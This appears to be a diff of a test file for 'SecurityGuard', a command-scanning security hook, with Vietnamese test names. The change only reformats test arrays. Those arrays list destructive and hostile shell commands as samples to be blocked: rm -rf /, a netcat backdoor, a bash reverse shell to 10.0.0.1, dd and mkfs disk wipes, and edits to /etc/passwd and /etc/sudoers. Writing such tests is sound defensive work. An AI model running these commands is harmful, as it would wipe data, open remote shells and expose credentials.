@@ -22,14 +22,7 @@ describe('SecurityGuard (PreToolUse Security Hook & Scanner)', () => {
     });
 
     it('nên chặn đứng lệnh rm -rf nguy hiểm trên các thư mục nhạy cảm', () => {
-      const malicious = [
-        'rm -rf /',
-        'rm -rf *',
-        'rm -rf ~',
-        'rm -rf .',
-        'rm -rf ..',
-        'rm -rf  /',
-      ];
+      const malicious = ['rm -rf /', 'rm -rf *', 'rm -rf ~', 'rm -rf .', 'rm -rf ..', 'rm -rf  /'];
 
       for (const cmd of malicious) {
         const result = SecurityGuard.scanCommand(cmd);
@@ -63,10 +56,7 @@ describe('SecurityGuard (PreToolUse Security Hook & Scanner)', () => {
     });
 
     it('nên chặn đứng Netcat backdoor và reverse shells', () => {
-      const cmds = [
-        'nc -lvp 4444 -e /bin/bash',
-        'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1',
-      ];
+      const cmds = ['nc -lvp 4444 -e /bin/bash', 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'];
 
       for (const cmd of cmds) {
         const result = SecurityGuard.scanCommand(cmd);
@@ -76,11 +66,7 @@ describe('SecurityGuard (PreToolUse Security Hook & Scanner)', () => {
     });
 
     it('nên chặn đứng các hành vi can thiệp ổ đĩa và hệ thống tệp nguy hiểm (dd, mkfs)', () => {
-      const cmds = [
-        'dd if=/dev/zero of=/dev/sda',
-        'mkfs.ext4 /dev/sdb1',
-        'mkfs -t vfat /dev/sdc',
-      ];
+      const cmds = ['dd if=/dev/zero of=/dev/sda', 'mkfs.ext4 /dev/sdb1', 'mkfs -t vfat /dev/sdc'];
 
       for (const cmd of cmds) {
         const result = SecurityGuard.scanCommand(cmd);
@@ -91,12 +77,7 @@ describe('SecurityGuard (PreToolUse Security Hook & Scanner)', () => {
     });
 
     it('nên chặn đứng các lệnh tắt nguồn hoặc khởi động lại hệ thống', () => {
-      const cmds = [
-        'shutdown -h now',
-        'reboot',
-        'poweroff',
-        'init 0',
-      ];
+      const cmds = ['shutdown -h now', 'reboot', 'poweroff', 'init 0'];
 
       for (const cmd of cmds) {
         const result = SecurityGuard.scanCommand(cmd);
@@ -107,11 +88,7 @@ describe('SecurityGuard (PreToolUse Security Hook & Scanner)', () => {
     });
 
     it('nên chặn đứng các nỗ lực thao tác tệp hệ thống nhạy cảm', () => {
-      const cmds = [
-        'echo "hacker" >> /etc/passwd',
-        'cat /etc/shadow',
-        'tee -a /etc/sudoers',
-      ];
+      const cmds = ['echo "hacker" >> /etc/passwd', 'cat /etc/shadow', 'tee -a /etc/sudoers'];
 
       for (const cmd of cmds) {
         const result = SecurityGuard.scanCommand(cmd);
